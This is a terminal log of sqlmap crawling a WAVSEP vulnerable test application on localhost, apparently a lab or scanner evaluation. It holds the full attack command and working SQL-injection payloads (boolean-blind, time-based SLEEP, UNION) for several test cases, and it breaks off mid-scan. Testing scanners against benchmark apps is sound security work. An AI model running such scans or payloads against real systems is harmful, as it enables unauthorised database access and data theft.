┌──(kali㉿kali)-[~/T2000]
└─$ sqlmap --dbms=mysql -u http://localhost:8080/wavsep/active/index-sql.jsp --crawl=3 --threads=7 --level=5 --risk=3 --batch --answers "already=N"
        ___
       __H__                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.7#stable}                                                                                                                      
|_ -| . ["]     | .'| . |                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:43:41 /2023-02-13/

do you want to check for the existence of site's sitemap(.xml) [y/N] N
[04:43:41] [INFO] starting crawler for target URL 'http://localhost:8080/wavsep/active/index-sql.jsp'
[04:43:41] [INFO] searching for links with depth 1
[04:43:41] [INFO] starting 2 threads
[04:43:41] [INFO] searching for links with depth 2                                                                                                         
[04:43:41] [INFO] starting 7 threads
[04:43:42] [INFO] 2/28 links visited (7%)
[04:43:42] [CRITICAL] connection exception detected ('not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code''). skipping URL 'http://localhost:8080/host-manager/html'                      
[04:43:43] [INFO] 14/28 links visited (50%)
[04:43:43] [CRITICAL] connection exception detected ('not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code''). skipping URL 'http://localhost:8080/manager/status'                         
[04:43:43] [INFO] 19/28 links visited (68%)
[04:43:43] [CRITICAL] connection exception detected ('not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code''). skipping URL 'http://localhost:8080/manager/html'                           
[04:43:43] [INFO] searching for links with depth 3                                                                                                         
[04:43:43] [INFO] starting 7 threads
[04:43:46] [INFO] 84/376 links visited (22%)
got a 302 redirect to 'http://localhost:8080/examples/jsp/'. Do you want to follow? [Y/n] Y
do you want to normalize crawling results [Y/n] Y                                                                                                          
do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
[04:43:55] [INFO] found a total of 68 targets
[1/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp?username=textvalue&password=textvalue2
do you want to test this URL? [Y/n/q]
> Y
[04:43:55] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp?username=textvalue&password=textvalue2'                                                                          
[04:43:55] [INFO] using '/home/kali/.local/share/sqlmap/output/results-02132023_0443am.csv' as the CSV results file in multiple targets mode
[04:43:55] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=0BB32130A6B...9152F4674C'). Do you want to use those [Y/n] Y
[04:43:55] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:43:55] [INFO] testing if the target URL content is stable
[04:43:56] [INFO] target URL content is stable
[04:43:56] [INFO] testing if GET parameter 'username' is dynamic
[04:43:56] [WARNING] GET parameter 'username' does not appear to be dynamic
[04:43:56] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
[04:43:56] [INFO] testing for SQL injection on GET parameter 'username'
[04:43:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:43:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:43:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:43:57] [INFO] GET parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="login failed")
[04:43:57] [INFO] testing 'Generic inline queries'
[04:43:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:43:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:43:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:43:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:43:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:43:57] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:43:57] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:43:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:43:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:43:57] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:43:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:43:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:43:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:43:57] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:43:57] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:43:57] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:43:57] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:43:57] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:43:57] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:43:57] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:43:57] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:43:57] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:43:57] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:43:57] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:43:57] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:43:57] [INFO] testing 'MySQL inline queries'
[04:43:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:43:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:43:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:43:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:43:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:43:57] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:43:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:44:07] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:44:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:44:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:44:07] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:44:07] [INFO] target URL appears to have 2 columns in query
[04:44:07] [INFO] GET parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[04:44:07] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 231 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=textvalue' OR NOT 4101=4101-- jLSL&password=textvalue2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=textvalue' AND (SELECT 4689 FROM (SELECT(SLEEP(5)))HXSE)-- nOHh&password=textvalue2

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: username=textvalue' UNION ALL SELECT CONCAT(0x7176706a71,0x525265577462587a5a6276655342414b4c6a456f5548587573636255737151697846795853645364,0x7170786b71),NULL-- -&password=textvalue2
---
do you want to exploit this SQL injection? [Y/n] Y
[04:44:07] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
SQL injection vulnerability has already been detected against 'localhost'. Do you want to skip further tests involving it? [Y/n] N
[2/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp?msg=textvalue
do you want to test this URL? [Y/n/q]
> Y
[04:44:07] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case02-InjectionInSearch-String-UnionExploit-WithDifferent200Responses.jsp?msg=textvalue'                                                                                                 
[04:44:07] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=8C38EB91B33...95845FB249'). Do you want to use those [Y/n] Y
[04:44:07] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:44:07] [INFO] testing if the target URL content is stable
[04:44:07] [INFO] target URL content is stable
[04:44:07] [INFO] testing if GET parameter 'msg' is dynamic
[04:44:07] [WARNING] GET parameter 'msg' does not appear to be dynamic
[04:44:07] [WARNING] heuristic (basic) test shows that GET parameter 'msg' might not be injectable
[04:44:07] [INFO] testing for SQL injection on GET parameter 'msg'
[04:44:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:44:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:44:08] [INFO] GET parameter 'msg' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="web")
[04:44:08] [INFO] testing 'Generic inline queries'
[04:44:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:44:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:44:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:44:08] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:44:08] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:44:08] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:44:08] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:44:08] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:44:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:08] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:08] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:08] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:08] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:08] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:08] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:08] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:44:08] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:44:08] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:44:08] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:44:08] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:44:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:44:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:44:08] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:44:08] [INFO] testing 'MySQL inline queries'
[04:44:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:44:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:44:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:44:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:44:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:44:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:44:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:44:18] [INFO] GET parameter 'msg' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:44:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:44:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:44:18] [INFO] target URL appears to be UNION injectable with 3 columns
[04:44:18] [INFO] GET parameter 'msg' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[04:44:18] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
GET parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 168 HTTP(s) requests:
---
Parameter: msg (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: msg=-4455' OR 5604=5604-- XEgM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msg=textvalue' AND (SELECT 2381 FROM (SELECT(SLEEP(5)))QCnV)-- iVZV

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msg=textvalue' UNION ALL SELECT NULL,NULL,CONCAT(0x716b767871,0x70614b685664424e58696b714a43524b536b59714f7a765169636a6c4e676c414b646d6b4c4d7451,0x716a716a71)-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:44:18] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[3/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp?username=textvalue
do you want to test this URL? [Y/n/q]
> Y
[04:44:18] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case03-InjectionInCalc-String-BooleanExploit-WithDifferent200Responses.jsp?username=textvalue'                                                                                            
[04:44:18] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=4A4CDC94BBA...1D5A1086AA'). Do you want to use those [Y/n] Y
[04:44:18] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:44:18] [INFO] testing if the target URL content is stable
[04:44:19] [INFO] target URL content is stable
[04:44:19] [INFO] testing if GET parameter 'username' is dynamic
[04:44:19] [WARNING] GET parameter 'username' does not appear to be dynamic
[04:44:19] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
[04:44:19] [INFO] testing for SQL injection on GET parameter 'username'
[04:44:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:44:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:44:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:44:20] [INFO] GET parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable 
[04:44:20] [INFO] testing 'Generic inline queries'
[04:44:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:44:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:44:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:44:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:44:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:44:20] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:44:20] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:44:20] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:44:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:20] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:20] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:20] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:20] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:20] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:20] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:20] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:44:20] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:44:20] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:44:20] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:44:20] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:44:20] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:44:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:44:20] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:44:20] [INFO] testing 'MySQL inline queries'
[04:44:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:44:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:44:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:44:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:44:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:44:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:44:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:44:30] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:44:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:44:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:44:30] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:44:30] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:44:30] [INFO] target URL appears to be UNION injectable with 1 columns
[04:44:30] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:44:30] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:44:30] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:44:30] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:44:30] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:44:30] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:44:30] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:44:30] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:44:30] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:44:31] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[04:44:31] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[04:44:31] [INFO] checking if the injection point on GET parameter 'username' is a false positive
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 683 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=textvalue' OR NOT 8771=8771-- KOsk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=textvalue' AND (SELECT 9597 FROM (SELECT(SLEEP(5)))YXoI)-- LvfJ
---
do you want to exploit this SQL injection? [Y/n] Y
[04:44:32] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.0.12
[4/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp?msg=textvalue
do you want to test this URL? [Y/n/q]
> Y
[04:44:32] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Valid/Case04-InjectionInUpdate-String-CommandInjection-WithDifferent200Responses.jsp?msg=textvalue'                                                                                             
[04:44:32] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=0ADBA69AF7D...67C2343FE1'). Do you want to use those [Y/n] Y
[04:44:32] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:44:32] [INFO] testing if the target URL content is stable
[04:44:32] [INFO] target URL content is stable
[04:44:32] [INFO] testing if GET parameter 'msg' is dynamic
[04:44:32] [WARNING] GET parameter 'msg' does not appear to be dynamic
[04:44:32] [WARNING] heuristic (basic) test shows that GET parameter 'msg' might not be injectable
[04:44:32] [INFO] testing for SQL injection on GET parameter 'msg'
[04:44:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:44:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:44:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:44:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:44:33] [INFO] GET parameter 'msg' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable 
[04:44:33] [INFO] testing 'Generic inline queries'
[04:44:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:44:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:44:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:44:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:44:33] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:44:33] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:44:33] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:44:33] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:44:33] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:33] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:44:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:44:33] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:44:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:33] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:44:33] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:44:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:44:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:44:33] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:44:33] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:44:33] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:44:33] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:44:33] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:44:33] [INFO] testing 'MySQL inline queries'
[04:44:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:44:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:44:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:44:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:44:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:44:33] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:44:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:44:44] [INFO] GET parameter 'msg' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:44:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:44:44] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:44:44] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:44:44] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:44:44] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:44:44] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:44:44] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:44:44] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
